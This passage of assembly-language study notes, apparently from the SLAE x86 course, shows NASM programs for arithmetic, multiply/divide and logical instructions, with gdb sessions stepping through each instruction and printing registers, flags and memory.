   0x080480d8 <_start+88>:	adc    al,0x22
   0x080480da <_start+90>:	stc    
   0x080480db <_start+91>:	adc    al,0x11
End of assembler dump.
0x080480d2 in _start ()
(gdb) 
$35 = 0x0
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$36 = [ PF IF ]
Dump of assembler code from 0x80480d7 to 0x80480e1:
=> 0x080480d7 <_start+87>:	stc    
   0x080480d8 <_start+88>:	adc    al,0x22
   0x080480da <_start+90>:	stc    
   0x080480db <_start+91>:	adc    al,0x11
   0x080480dd <_start+93>:	mov    ax,0x1122
End of assembler dump.
0x080480d7 in _start ()
(gdb) 
$37 = 0x0
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$38 = [ CF PF IF ]
Dump of assembler code from 0x80480d8 to 0x80480e2:
=> 0x080480d8 <_start+88>:	adc    al,0x22
   0x080480da <_start+90>:	stc    
   0x080480db <_start+91>:	adc    al,0x11
   0x080480dd <_start+93>:	mov    ax,0x1122
   0x080480e1 <_start+97>:	stc    
End of assembler dump.
0x080480d8 in _start ()
(gdb) 
$39 = 0x23
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$40 = [ IF ]
Dump of assembler code from 0x80480da to 0x80480e4:
=> 0x080480da <_start+90>:	stc    
   0x080480db <_start+91>:	adc    al,0x11
   0x080480dd <_start+93>:	mov    ax,0x1122
   0x080480e1 <_start+97>:	stc    
   0x080480e2 <_start+98>:	adc    ax,0x3344
End of assembler dump.
0x080480da in _start ()
(gdb) 
$41 = 0x23
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$42 = [ CF IF ]
Dump of assembler code from 0x80480db to 0x80480e5:
=> 0x080480db <_start+91>:	adc    al,0x11
   0x080480dd <_start+93>:	mov    ax,0x1122
   0x080480e1 <_start+97>:	stc    
   0x080480e2 <_start+98>:	adc    ax,0x3344
End of assembler dump.
0x080480db in _start ()
(gdb) 
$43 = 0x35
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$44 = [ PF IF ]
Dump of assembler code from 0x80480dd to 0x80480e7:
=> 0x080480dd <_start+93>:	mov    ax,0x1122
   0x080480e1 <_start+97>:	stc    
   0x080480e2 <_start+98>:	adc    ax,0x3344
   0x080480e6 <_start+102>:	mov    eax,0xffffffff
End of assembler dump.
0x080480dd in _start ()
(gdb) 
$45 = 0x1122
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$46 = [ PF IF ]
Dump of assembler code from 0x80480e1 to 0x80480eb:
=> 0x080480e1 <_start+97>:	stc    
   0x080480e2 <_start+98>:	adc    ax,0x3344
   0x080480e6 <_start+102>:	mov    eax,0xffffffff
End of assembler dump.
0x080480e1 in _start ()
(gdb) 
$47 = 0x1122
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$48 = [ CF PF IF ]
Dump of assembler code from 0x80480e2 to 0x80480ec:
=> 0x080480e2 <_start+98>:	adc    ax,0x3344
   0x080480e6 <_start+102>:	mov    eax,0xffffffff
   0x080480eb <_start+107>:	stc    
End of assembler dump.
0x080480e2 in _start ()
(gdb) 
$49 = 0x4467
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$50 = [ IF ]
Dump of assembler code from 0x80480e6 to 0x80480f0:
=> 0x080480e6 <_start+102>:	mov    eax,0xffffffff
   0x080480eb <_start+107>:	stc    
   0x080480ec <_start+108>:	adc    eax,0x10
   0x080480ef <_start+111>:	mov    eax,0xa
End of assembler dump.
0x080480e6 in _start ()
(gdb) 
$51 = 0xffffffff
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$52 = [ IF ]
Dump of assembler code from 0x80480eb to 0x80480f5:
=> 0x080480eb <_start+107>:	stc    
   0x080480ec <_start+108>:	adc    eax,0x10
   0x080480ef <_start+111>:	mov    eax,0xa
   0x080480f4 <_start+116>:	sub    eax,0x5
End of assembler dump.
0x080480eb in _start ()
(gdb) 
$53 = 0xffffffff
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$54 = [ CF IF ]
Dump of assembler code from 0x80480ec to 0x80480f6:
=> 0x080480ec <_start+108>:	adc    eax,0x10
   0x080480ef <_start+111>:	mov    eax,0xa
   0x080480f4 <_start+116>:	sub    eax,0x5
End of assembler dump.
0x080480ec in _start ()
(gdb) 
$55 = 0x10
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$56 = [ CF AF IF ]
Dump of assembler code from 0x80480ef to 0x80480f9:
=> 0x080480ef <_start+111>:	mov    eax,0xa
   0x080480f4 <_start+116>:	sub    eax,0x5
   0x080480f7 <_start+119>:	stc    
   0x080480f8 <_start+120>:	sbb    eax,0x4
End of assembler dump.
0x080480ef in _start ()
(gdb) 
$57 = 0xa
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$58 = [ CF AF IF ]
Dump of assembler code from 0x80480f4 to 0x80480fe:
=> 0x080480f4 <_start+116>:	sub    eax,0x5
   0x080480f7 <_start+119>:	stc    
   0x080480f8 <_start+120>:	sbb    eax,0x4
   0x080480fb <_start+123>:	inc    eax
   0x080480fc <_start+124>:	dec    eax
   0x080480fd <_start+125>:	mov    eax,0x1
End of assembler dump.
0x080480f4 in _start ()
(gdb) 
$59 = 0x5
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$60 = [ PF IF ]
Dump of assembler code from 0x80480f7 to 0x8048101:
=> 0x080480f7 <_start+119>:	stc    
   0x080480f8 <_start+120>:	sbb    eax,0x4
   0x080480fb <_start+123>:	inc    eax
   0x080480fc <_start+124>:	dec    eax
   0x080480fd <_start+125>:	mov    eax,0x1
End of assembler dump.
0x080480f7 in _start ()
(gdb) 
$61 = 0x5
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$62 = [ CF PF IF ]
Dump of assembler code from 0x80480f8 to 0x8048102:
=> 0x080480f8 <_start+120>:	sbb    eax,0x4
   0x080480fb <_start+123>:	inc    eax
   0x080480fc <_start+124>:	dec    eax
   0x080480fd <_start+125>:	mov    eax,0x1
End of assembler dump.
0x080480f8 in _start ()
(gdb) 
$63 = 0x0
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$64 = [ PF ZF IF ]
Dump of assembler code from 0x80480fb to 0x8048105:
=> 0x080480fb <_start+123>:	inc    eax
   0x080480fc <_start+124>:	dec    eax
   0x080480fd <_start+125>:	mov    eax,0x1
   0x08048102 <_start+130>:	mov    ebx,0xa
End of assembler dump.
0x080480fb in _start ()
(gdb) 
$65 = 0x1
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$66 = [ IF ]
Dump of assembler code from 0x80480fc to 0x8048106:
=> 0x080480fc <_start+124>:	dec    eax
   0x080480fd <_start+125>:	mov    eax,0x1
   0x08048102 <_start+130>:	mov    ebx,0xa
End of assembler dump.
0x080480fc in _start ()
(gdb) 
$67 = 0x0
0x804910c <var1>:	0x33
0x804910d <var2>:	0x4466
0x804910f <var3>:	0x0000000f
$68 = [ PF ZF IF ]
Dump of assembler code from 0x80480fd to 0x8048107:
=> 0x080480fd <_start+125>:	mov    eax,0x1
   0x08048102 <_start+130>:	mov    ebx,0xa
End of assembler dump.
0x080480fd in _start ()
(gdb) c
Continuing.
[Inferior 1 (process 23419) exited with code 012]
Error while running hook_stop:
No registers.

Multiplication-Division:

vim MulDiv.nasm

; Filename: MulDiv.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

global _start

section .text
_start:

        ; unsigned r/m8 multiplication
        mov eax, 0x0

        mov al, 0x10
        mov bl, 0x2
        mul bl

        mov al, 0xFF
        mul bl

        ; unsigned r/m16 multiplication

        mov eax, 0x0
        mov ebx, 0x0

        mov ax, 0x1122
        mov bx, 0x0002
        mul bx

        mov ax, 0x1122
        mov bx, 0x1122
        mul bx

        ; unsigned r/m32 multiplication

        mov eax, 0x11223344
        mov ebx, 0x00000002
        mul ebx

        mov eax, 0x11223344
        mov ebx, 0x55667788
        mul ebx

        ; multiplication using memory locations

        mul byte [var1]
        mul word [var2]
        mul dword [var3]

        ; division using r/m16

        mov dx, 0x0
        mov ax, 0x7788
        mov cx, 0x2
        div cx

        mov ax, 0x7788 + 0x1
        mov cx, 0x2
        div cx

        ; exit program

        mov eax, 1
        mov ebx, 10
        int 0x80

section .data

        var1    db      0x05
        var2    dw      0x1122
        var3    dd      0x11223344

./compile.sh MulDiv
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
gdb -q ./MulDiv
Reading symbols from /SLAE x86/Arithmetic/MulDiv...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) run
Starting program: /SLAE x86/Arithmetic/MulDiv 

Breakpoint 1, 0x08048080 in _start ()
(gdb) disassemble 
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	mov    eax,0x0
   0x08048085 <+5>:	mov    al,0x10
   0x08048087 <+7>:	mov    bl,0x2
   0x08048089 <+9>:	mul    bl
   0x0804808b <+11>:	mov    al,0xff
   0x0804808d <+13>:	mul    bl
   0x0804808f <+15>:	mov    eax,0x0
   0x08048094 <+20>:	mov    ebx,0x0
   0x08048099 <+25>:	mov    ax,0x1122
   0x0804809d <+29>:	mov    bx,0x2
   0x080480a1 <+33>:	mul    bx
   0x080480a4 <+36>:	mov    ax,0x1122
   0x080480a8 <+40>:	mov    bx,0x1122
   0x080480ac <+44>:	mul    bx
   0x080480af <+47>:	mov    eax,0x11223344
   0x080480b4 <+52>:	mov    ebx,0x2
   0x080480b9 <+57>:	mul    ebx
   0x080480bb <+59>:	mov    eax,0x11223344
   0x080480c0 <+64>:	mov    ebx,0x55667788
   0x080480c5 <+69>:	mul    ebx
   0x080480c7 <+71>:	mul    BYTE PTR ds:0x8049100
   0x080480cd <+77>:	mul    WORD PTR ds:0x8049101
   0x080480d4 <+84>:	mul    DWORD PTR ds:0x8049103
   0x080480da <+90>:	mov    dx,0x0
   0x080480de <+94>:	mov    ax,0x7788
   0x080480e2 <+98>:	mov    cx,0x2
   0x080480e6 <+102>:	div    cx
   0x080480e9 <+105>:	mov    ax,0x7789
   0x080480ed <+109>:	mov    cx,0x2
   0x080480f1 <+113>:	div    cx
   0x080480f4 <+116>:	mov    eax,0x1
   0x080480f9 <+121>:	mov    ebx,0xa
   0x080480fe <+126>:	int    0x80
End of assembler dump.
(gdb) define hook-stop 
Type commands for definition of "hook-stop".
End with a line saying just "end".
>print/x $al
>print/x $bl
>print/x $ax 
>disassemble $eip,+10
>end
(gdb) nexti
$1 = 0x0
$2 = 0x0
$3 = 0x0
Dump of assembler code from 0x8048085 to 0x804808f:
=> 0x08048085 <_start+5>:	mov    al,0x10
   0x08048087 <_start+7>:	mov    bl,0x2
   0x08048089 <_start+9>:	mul    bl
   0x0804808b <_start+11>:	mov    al,0xff
   0x0804808d <_start+13>:	mul    bl
End of assembler dump.
0x08048085 in _start ()
(gdb) 
$4 = 0x10
$5 = 0x0
$6 = 0x10
Dump of assembler code from 0x8048087 to 0x8048091:
=> 0x08048087 <_start+7>:	mov    bl,0x2
   0x08048089 <_start+9>:	mul    bl
   0x0804808b <_start+11>:	mov    al,0xff
   0x0804808d <_start+13>:	mul    bl
   0x0804808f <_start+15>:	mov    eax,0x0
End of assembler dump.
0x08048087 in _start ()
(gdb) 
$7 = 0x10
$8 = 0x2
$9 = 0x10
Dump of assembler code from 0x8048089 to 0x8048093:
=> 0x08048089 <_start+9>:	mul    bl
   0x0804808b <_start+11>:	mov    al,0xff
   0x0804808d <_start+13>:	mul    bl
   0x0804808f <_start+15>:	mov    eax,0x0
End of assembler dump.
0x08048089 in _start ()
(gdb) 
$10 = 0x20
$11 = 0x2
$12 = 0x20
Dump of assembler code from 0x804808b to 0x8048095:
=> 0x0804808b <_start+11>:	mov    al,0xff
   0x0804808d <_start+13>:	mul    bl
   0x0804808f <_start+15>:	mov    eax,0x0
   0x08048094 <_start+20>:	mov    ebx,0x0
End of assembler dump.
0x0804808b in _start ()
(gdb) 
$13 = 0xff
$14 = 0x2
$15 = 0xff
Dump of assembler code from 0x804808d to 0x8048097:
=> 0x0804808d <_start+13>:	mul    bl
   0x0804808f <_start+15>:	mov    eax,0x0
   0x08048094 <_start+20>:	mov    ebx,0x0
End of assembler dump.
0x0804808d in _start ()
(gdb) print $eflags
$16 = [ IF ]
(gdb) nexti
$17 = 0xfe
$18 = 0x2
$19 = 0x1fe
Dump of assembler code from 0x804808f to 0x8048099:
=> 0x0804808f <_start+15>:	mov    eax,0x0
   0x08048094 <_start+20>:	mov    ebx,0x0
End of assembler dump.
0x0804808f in _start ()
(gdb) print $eflags
$20 = [ CF SF IF OF ]
(gdb) quit
A debugging session is active.

	Inferior 1 [process 27283] will be killed.

Quit anyway? (y or n) y
gdb -q ./MulDiv
Reading symbols from /SLAE x86/Arithmetic/MulDiv...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) disassemble _start
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    eax,0x0
   0x08048085 <+5>:	mov    al,0x10
   0x08048087 <+7>:	mov    bl,0x2
   0x08048089 <+9>:	mul    bl
   0x0804808b <+11>:	mov    al,0xff
   0x0804808d <+13>:	mul    bl
   0x0804808f <+15>:	mov    eax,0x0
   0x08048094 <+20>:	mov    ebx,0x0
   0x08048099 <+25>:	mov    ax,0x1122
   0x0804809d <+29>:	mov    bx,0x2
   0x080480a1 <+33>:	mul    bx
   0x080480a4 <+36>:	mov    ax,0x1122
   0x080480a8 <+40>:	mov    bx,0x1122
   0x080480ac <+44>:	mul    bx
   0x080480af <+47>:	mov    eax,0x11223344
   0x080480b4 <+52>:	mov    ebx,0x2
   0x080480b9 <+57>:	mul    ebx
   0x080480bb <+59>:	mov    eax,0x11223344
   0x080480c0 <+64>:	mov    ebx,0x55667788
   0x080480c5 <+69>:	mul    ebx
   0x080480c7 <+71>:	mul    BYTE PTR ds:0x8049100
   0x080480cd <+77>:	mul    WORD PTR ds:0x8049101
   0x080480d4 <+84>:	mul    DWORD PTR ds:0x8049103
   0x080480da <+90>:	mov    dx,0x0
   0x080480de <+94>:	mov    ax,0x7788
   0x080480e2 <+98>:	mov    cx,0x2
   0x080480e6 <+102>:	div    cx
   0x080480e9 <+105>:	mov    ax,0x7789
   0x080480ed <+109>:	mov    cx,0x2
   0x080480f1 <+113>:	div    cx
   0x080480f4 <+116>:	mov    eax,0x1
   0x080480f9 <+121>:	mov    ebx,0xa
   0x080480fe <+126>:	int    0x80
End of assembler dump.
(gdb) break *&_start +59
Breakpoint 2 at 0x80480bb
(gdb) run
Starting program: /SLAE x86/Arithmetic/MulDiv 

Breakpoint 1, 0x08048080 in _start ()
(gdb) disassemble $eip,+10
Dump of assembler code from 0x8048080 to 0x804808a:
=> 0x08048080 <_start+0>:	mov    eax,0x0
   0x08048085 <_start+5>:	mov    al,0x10
   0x08048087 <_start+7>:	mov    bl,0x2
   0x08048089 <_start+9>:	mul    bl
End of assembler dump.
(gdb) c
Continuing.

Breakpoint 2, 0x080480bb in _start ()
(gdb) disassemble $eip,+10
Dump of assembler code from 0x80480bb to 0x80480c5:
=> 0x080480bb <_start+59>:	mov    eax,0x11223344
   0x080480c0 <_start+64>:	mov    ebx,0x55667788
End of assembler dump.
(gdb) display/x $edx
1: /x $edx = 0x0
(gdb) display/x $eax
2: /x $eax = 0x22446688
(gdb) display/x $ebx
3: /x $ebx = 0x2
(gdb) display $eflags
4: $eflags = [ PF IF ]
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>disassemble $eip,+15
>end
(gdb) nexti
0x080480c0 in _start ()
4: $eflags = [ PF IF ]
3: /x $ebx = 0x2
2: /x $eax = 0x11223344
1: /x $edx = 0x0
(gdb) disas
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    eax,0x0
   0x08048085 <+5>:	mov    al,0x10
   0x08048087 <+7>:	mov    bl,0x2
   0x08048089 <+9>:	mul    bl
   0x0804808b <+11>:	mov    al,0xff
   0x0804808d <+13>:	mul    bl
   0x0804808f <+15>:	mov    eax,0x0
   0x08048094 <+20>:	mov    ebx,0x0
   0x08048099 <+25>:	mov    ax,0x1122
   0x0804809d <+29>:	mov    bx,0x2
   0x080480a1 <+33>:	mul    bx
   0x080480a4 <+36>:	mov    ax,0x1122
   0x080480a8 <+40>:	mov    bx,0x1122
   0x080480ac <+44>:	mul    bx
   0x080480af <+47>:	mov    eax,0x11223344
   0x080480b4 <+52>:	mov    ebx,0x2
   0x080480b9 <+57>:	mul    ebx
   0x080480bb <+59>:	mov    eax,0x11223344
=> 0x080480c0 <+64>:	mov    ebx,0x55667788
   0x080480c5 <+69>:	mul    ebx
   0x080480c7 <+71>:	mul    BYTE PTR ds:0x8049100
   0x080480cd <+77>:	mul    WORD PTR ds:0x8049101
   0x080480d4 <+84>:	mul    DWORD PTR ds:0x8049103
   0x080480da <+90>:	mov    dx,0x0
   0x080480de <+94>:	mov    ax,0x7788
   0x080480e2 <+98>:	mov    cx,0x2
   0x080480e6 <+102>:	div    cx
   0x080480e9 <+105>:	mov    ax,0x7789
   0x080480ed <+109>:	mov    cx,0x2
   0x080480f1 <+113>:	div    cx
   0x080480f4 <+116>:	mov    eax,0x1
   0x080480f9 <+121>:	mov    ebx,0xa
   0x080480fe <+126>:	int    0x80
End of assembler dump.
(gdb) nexti
Dump of assembler code from 0x80480c5 to 0x80480d4:
=> 0x080480c5 <_start+69>:	mul    ebx
   0x080480c7 <_start+71>:	mul    BYTE PTR ds:0x8049100
   0x080480cd <_start+77>:	mul    WORD PTR ds:0x8049101
End of assembler dump.
0x080480c5 in _start ()
4: $eflags = [ PF IF ]
3: /x $ebx = 0x55667788
2: /x $eax = 0x11223344
1: /x $edx = 0x0
(gdb) 
Dump of assembler code from 0x80480c7 to 0x80480d6:
=> 0x080480c7 <_start+71>:	mul    BYTE PTR ds:0x8049100
   0x080480cd <_start+77>:	mul    WORD PTR ds:0x8049101
   0x080480d4 <_start+84>:	mul    DWORD PTR ds:0x8049103
End of assembler dump.
0x080480c7 in _start ()
4: $eflags = [ CF IF OF ]
3: /x $ebx = 0x55667788
2: /x $eax = 0x117d820
1: /x $edx = 0x5b736a6
(gdb) disas
Dump of assembler code for function _start:
   0x08048080 <+0>:	mov    eax,0x0
   0x08048085 <+5>:	mov    al,0x10
   0x08048087 <+7>:	mov    bl,0x2
   0x08048089 <+9>:	mul    bl
   0x0804808b <+11>:	mov    al,0xff
   0x0804808d <+13>:	mul    bl
   0x0804808f <+15>:	mov    eax,0x0
   0x08048094 <+20>:	mov    ebx,0x0
   0x08048099 <+25>:	mov    ax,0x1122
   0x0804809d <+29>:	mov    bx,0x2
   0x080480a1 <+33>:	mul    bx
   0x080480a4 <+36>:	mov    ax,0x1122
   0x080480a8 <+40>:	mov    bx,0x1122
   0x080480ac <+44>:	mul    bx
   0x080480af <+47>:	mov    eax,0x11223344
   0x080480b4 <+52>:	mov    ebx,0x2
   0x080480b9 <+57>:	mul    ebx
   0x080480bb <+59>:	mov    eax,0x11223344
   0x080480c0 <+64>:	mov    ebx,0x55667788
   0x080480c5 <+69>:	mul    ebx
=> 0x080480c7 <+71>:	mul    BYTE PTR ds:0x8049100
   0x080480cd <+77>:	mul    WORD PTR ds:0x8049101
   0x080480d4 <+84>:	mul    DWORD PTR ds:0x8049103
   0x080480da <+90>:	mov    dx,0x0
   0x080480de <+94>:	mov    ax,0x7788
   0x080480e2 <+98>:	mov    cx,0x2
   0x080480e6 <+102>:	div    cx
   0x080480e9 <+105>:	mov    ax,0x7789
   0x080480ed <+109>:	mov    cx,0x2
   0x080480f1 <+113>:	div    cx
   0x080480f4 <+116>:	mov    eax,0x1
   0x080480f9 <+121>:	mov    ebx,0xa
   0x080480fe <+126>:	int    0x80
End of assembler dump.
(gdb) break *0x080480da
Breakpoint 3 at 0x80480da
(gdb) c
Continuing.
Dump of assembler code from 0x80480da to 0x80480e9:
=> 0x080480da <_start+90>:	mov    dx,0x0
   0x080480de <_start+94>:	mov    ax,0x7788
   0x080480e2 <_start+98>:	mov    cx,0x2
   0x080480e6 <_start+102>:	div    cx
End of assembler dump.

Breakpoint 3, 0x080480da in _start ()
4: $eflags = [ CF PF IF OF ]
3: /x $ebx = 0x55667788
2: /x $eax = 0x55e7e500
1: /x $edx = 0x12b867
(gdb) nexti
Dump of assembler code from 0x80480de to 0x80480ed:
=> 0x080480de <_start+94>:	mov    ax,0x7788
   0x080480e2 <_start+98>:	mov    cx,0x2
   0x080480e6 <_start+102>:	div    cx
   0x080480e9 <_start+105>:	mov    ax,0x7789
End of assembler dump.
0x080480de in _start ()
4: $eflags = [ CF PF IF OF ]
3: /x $ebx = 0x55667788
2: /x $eax = 0x55e7e500
1: /x $edx = 0x120000
(gdb) 
Dump of assembler code from 0x80480e2 to 0x80480f1:
=> 0x080480e2 <_start+98>:	mov    cx,0x2
   0x080480e6 <_start+102>:	div    cx
   0x080480e9 <_start+105>:	mov    ax,0x7789
   0x080480ed <_start+109>:	mov    cx,0x2
End of assembler dump.
0x080480e2 in _start ()
4: $eflags = [ CF PF IF OF ]
3: /x $ebx = 0x55667788
2: /x $eax = 0x55e77788
1: /x $edx = 0x120000
(gdb) 
Dump of assembler code from 0x80480e6 to 0x80480f5:
=> 0x080480e6 <_start+102>:	div    cx
   0x080480e9 <_start+105>:	mov    ax,0x7789
   0x080480ed <_start+109>:	mov    cx,0x2
   0x080480f1 <_start+113>:	div    cx
   0x080480f4 <_start+116>:	mov    eax,0x1
End of assembler dump.
0x080480e6 in _start ()
4: $eflags = [ CF PF IF OF ]
3: /x $ebx = 0x55667788
2: /x $eax = 0x55e77788
1: /x $edx = 0x120000
(gdb) print/x $ecx
$1 = 0x2
(gdb) nexti
Dump of assembler code from 0x80480e9 to 0x80480f8:
=> 0x080480e9 <_start+105>:	mov    ax,0x7789
   0x080480ed <_start+109>:	mov    cx,0x2
   0x080480f1 <_start+113>:	div    cx
   0x080480f4 <_start+116>:	mov    eax,0x1
End of assembler dump.
0x080480e9 in _start ()
4: $eflags = [ CF PF IF OF ]
3: /x $ebx = 0x55667788
2: /x $eax = 0x55e73bc4
1: /x $edx = 0x120000
(gdb) print/x $ax
$2 = 0x3bc4
(gdb) print/x $dx
$3 = 0x0
(gdb) nexti
Dump of assembler code from 0x80480ed to 0x80480fc:
=> 0x080480ed <_start+109>:	mov    cx,0x2
   0x080480f1 <_start+113>:	div    cx
   0x080480f4 <_start+116>:	mov    eax,0x1
   0x080480f9 <_start+121>:	mov    ebx,0xa
End of assembler dump.
0x080480ed in _start ()
4: $eflags = [ CF PF IF OF ]
3: /x $ebx = 0x55667788
2: /x $eax = 0x55e77789
1: /x $edx = 0x120000
(gdb) 
Dump of assembler code from 0x80480f1 to 0x8048100:
=> 0x080480f1 <_start+113>:	div    cx
   0x080480f4 <_start+116>:	mov    eax,0x1
   0x080480f9 <_start+121>:	mov    ebx,0xa
   0x080480fe <_start+126>:	int    0x80
End of assembler dump.
0x080480f1 in _start ()
4: $eflags = [ CF PF IF OF ]
3: /x $ebx = 0x55667788
2: /x $eax = 0x55e77789
1: /x $edx = 0x120000
(gdb) 
Dump of assembler code from 0x80480f4 to 0x8048103:
=> 0x080480f4 <_start+116>:	mov    eax,0x1
   0x080480f9 <_start+121>:	mov    ebx,0xa
   0x080480fe <_start+126>:	int    0x80
   0x08048100:	add    eax,0x33441122
End of assembler dump.
0x080480f4 in _start ()
4: $eflags = [ CF PF IF OF ]
3: /x $ebx = 0x55667788
2: /x $eax = 0x55e73bc4
1: /x $edx = 0x120001
(gdb) print/x $ax
$4 = 0x3bc4
(gdb) print/x $dx
$5 = 0x1
(gdb) quit
A debugging session is active.

	Inferior 1 [process 28347] will be killed.

Quit anyway? (y or n) y

Logical Instructions:

    0101 
AND 0011 
  = 0001 

    0011 
AND 0010 
  = 0010 

   0101 
OR 0011
 = 0111 

   0010 
OR 1000 
 = 1010 
 
    0101 
XOR 0011 
  = 0110 

    0010 
XOR 1010 
  = 1000 
 
NOT 0111  
  = 1000  
NOT 10101011  
  = 01010100  

vim Logical.nasm

; Filename: Logical.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com
;
;
; Purpose:

global _start

section .text
_start:

        ; AND usage

        mov al, 0x10
        and al, 0x01

        and byte [var1], 0xaa
        and word [var2], 0x1122

        ; OR usage

        mov al, 0x10
        or al, 0x01

        or byte [var1], 0xaa

        mov eax, 0
        or eax, 0x0

        ; XOR

        xor dword [var3], 0x11223344
        xor dword [var3], 0x11223344

        ; NOT

        mov eax, 0xFFFFFFFF
        not eax
        not eax


        mov eax, 1
        mov ebx, 10             ; sys_exit syscall
        int 0x80

section .data

        var1    db      0xaa
        var2    dw      0xbbcc
        var3    dd      0x11223344

./compile.sh Logical
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
gdb -q ./Logical
Reading symbols from /SLAE x86/Logical/Logical...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb) break _start
Breakpoint 1 at 0x8048080
(gdb) run
Starting program: /SLAE x86/Logical/Logical 

Breakpoint 1, 0x08048080 in _start ()
(gdb) disassemble 
Dump of assembler code for function _start:
=> 0x08048080 <+0>:	mov    al,0x10
   0x08048082 <+2>:	and    al,0x1
   0x08048084 <+4>:	and    BYTE PTR ds:0x80490d0,0xaa
   0x0804808b <+11>:	and    WORD PTR ds:0x80490d1,0x1122
   0x08048094 <+20>:	mov    al,0x10
   0x08048096 <+22>:	or     al,0x1
   0x08048098 <+24>:	or     BYTE PTR ds:0x80490d0,0xaa
   0x0804809f <+31>:	mov    eax,0x0
   0x080480a4 <+36>:	or     eax,0x0
   0x080480a7 <+39>:	xor    DWORD PTR ds:0x80490d3,0x11223344
   0x080480b1 <+49>:	xor    DWORD PTR ds:0x80490d3,0x11223344
   0x080480bb <+59>:	mov    eax,0xffffffff
   0x080480c0 <+64>:	not    eax
   0x080480c2 <+66>:	not    eax
   0x080480c4 <+68>:	mov    eax,0x1
   0x080480c9 <+73>:	mov    ebx,0xa
   0x080480ce <+78>:	int    0x80
End of assembler dump.
(gdb) display/x $al
1: /x $al = 0x0
(gdb) display/x $eax
2: /x $eax = 0x0
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/xb &var1
>x/xh &var2
>x/xw &var3  
>disassemble $eip,+10
>end
(gdb) nexti
0x80490d0 <var1>:	0xaa
0x80490d1 <var2>:	0xbbcc
0x80490d3 <var3>:	0x11223344
Dump of assembler code from 0x8048082 to 0x804808c:
=> 0x08048082 <_start+2>:	and    al,0x1
   0x08048084 <_start+4>:	and    BYTE PTR ds:0x80490d0,0xaa
   0x0804808b <_start+11>:	and    WORD PTR ds:0x80490d1,0x1122
End of assembler dump.
0x08048082 in _start ()
2: /x $eax = 0x10
1: /x $al = 0x10
(gdb) 
0x80490d0 <var1>:	0xaa
0x80490d1 <var2>:	0xbbcc
0x80490d3 <var3>:	0x11223344
Dump of assembler code from 0x8048084 to 0x804808e:
=> 0x08048084 <_start+4>:	and    BYTE PTR ds:0x80490d0,0xaa
   0x0804808b <_start+11>:	and    WORD PTR ds:0x80490d1,0x1122
End of assembler dump.
0x08048084 in _start ()
2: /x $eax = 0x0
1: /x $al = 0x0
(gdb) 
0x80490d0 <var1>:	0xaa
0x80490d1 <var2>:	0xbbcc
0x80490d3 <var3>:	0x11223344
Dump of assembler code from 0x804808b to 0x8048095:
=> 0x0804808b <_start+11>:	and    WORD PTR ds:0x80490d1,0x1122
   0x08048094 <_start+20>:	mov    al,0x10
End of assembler dump.
0x0804808b in _start ()
2: /x $eax = 0x0
1: /x $al = 0x0
(gdb) 
0x80490d0 <var1>:	0xaa
0x80490d1 <var2>:	0x1100
0x80490d3 <var3>:	0x11223344
Dump of assembler code from 0x8048094 to 0x804809e:
=> 0x08048094 <_start+20>:	mov    al,0x10
   0x08048096 <_start+22>:	or     al,0x1
   0x08048098 <_start+24>:	or     BYTE PTR ds:0x80490d0,0xaa
End of assembler dump.
0x08048094 in _start ()
2: /x $eax = 0x0
1: /x $al = 0x0
(gdb) 
0x80490d0 <var1>:	0xaa
0x80490d1 <var2>:	0x1100
0x80490d3 <var3>:	0x11223344
Dump of assembler code from 0x8048096 to 0x80480a0:
=> 0x08048096 <_start+22>:	or     al,0x1
   0x08048098 <_start+24>:	or     BYTE PTR ds:0x80490d0,0xaa
   0x0804809f <_start+31>:	mov    eax,0x0
End of assembler dump.
0x08048096 in _start ()
2: /x $eax = 0x10
1: /x $al = 0x10
(gdb) 
0x80490d0 <var1>:	0xaa
0x80490d1 <var2>:	0x1100
0x80490d3 <var3>:	0x11223344
Dump of assembler code from 0x8048098 to 0x80480a2:
=> 0x08048098 <_start+24>:	or     BYTE PTR ds:0x80490d0,0xaa
   0x0804809f <_start+31>:	mov    eax,0x0
End of assembler dump.
0x08048098 in _start ()
2: /x $eax = 0x11
1: /x $al = 0x11
(gdb) 
0x80490d0 <var1>:	0xaa
0x80490d1 <var2>:	0x1100
0x80490d3 <var3>:	0x11223344
